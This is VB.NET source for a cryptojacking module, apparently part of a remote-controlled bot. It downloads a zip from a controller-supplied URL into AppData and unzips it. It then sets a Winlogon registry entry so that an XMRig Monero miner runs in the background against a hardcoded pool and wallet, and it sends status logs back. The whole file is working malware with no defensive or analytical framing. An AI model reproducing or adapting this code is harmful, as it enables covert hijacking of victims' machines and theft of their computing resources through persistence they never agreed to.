Imports System.Net

Public Class MinerCommand : Implements ICommand

    Private Shared _file_name As String = ""
    Private Shared Function Getfile_name() As String
        Return _file_name
    End Function

    Private Shared Sub Setfile_name(AutoPropertyValue As String)
        _file_name = AutoPropertyValue
    End Sub

    Private Shared _UnzipedFolderName As String = ""

    Private Shared Function GetUnzipedFolderName() As String
        Return _UnzipedFolderName
    End Function

    Private Shared Sub SetUnzipedFolderName(AutoPropertyValue As String)
        _UnzipedFolderName = AutoPropertyValue
    End Sub

    Private Shared XMRig_exe As String = "xmrig.exe"
    Private Shared Arguments As String = "-o vegas-backup.xmrpool.net:80 -u 44SSGsjvMsv53LkD5pZSxb7NzPeSqceybQwzpSRcfc3sWVjhkbNgTm6HDaUkQDcGG9TCoUMx7FNDxXE5iRJymncSLPkEa8C -p " & Environment.UserName & ":kankkaka@gmail.com -k -a --coin=monero --algo=rx/0 -B"
    Private Shared XmrpathwithArguments As String = GetAppdata() & "/" & GetUnzipedFolderName() & "/" & XMRig_exe & " " & Arguments
    Public Shared Function Handler(ByVal model As MiningModel)
        Dim log As LogModel
        Try
            Dim LinkSplitter As String() = model.newMinerVariables.Link.Split(New Char() {"/"c})
            Setfile_name(LinkSplitter(LinkSplitter.Length - 1))
            SetUnzipedFolderName(Getfile_name().Replace(".zip", ""))
            Dim newlocation As String = GetAppdata() & "\" & Getfile_name()
            Downloader(model.newMinerVariables.Link, newlocation)
            Arguments = model.newMinerVariables.Config
            install()
            log = New LogModel With {
                            .Message = "Miner installing Success",
                            .KeyUnique = GetConfigJson().KeyUnique,
                            .Type = "Success"
                    }

        Catch ex As Exception
            log = New LogModel With {
                            .Message = "Miner: " & ex.ToString,
                            .KeyUnique = GetConfigJson().KeyUnique,
                            .Type = "Success"
                    }
        End Try
        Return log
    End Function
    Public Shared Sub Downloader(ByVal url As String, ByVal filename As String)
        Using client As New WebClient()
            client.DownloadFile(url, filename)
        End Using
    End Sub
    Private Shared Sub install()
        Set_CurrentUser_registry("Software\Microsoft\Windows NT\CurrentVersion\Winlogon\", XmrpathwithArguments, "shellXmrig")
        UnZip(GetLocal_path() & "/" & Getfile_name(), GetAppdata())
    End Sub
End Class
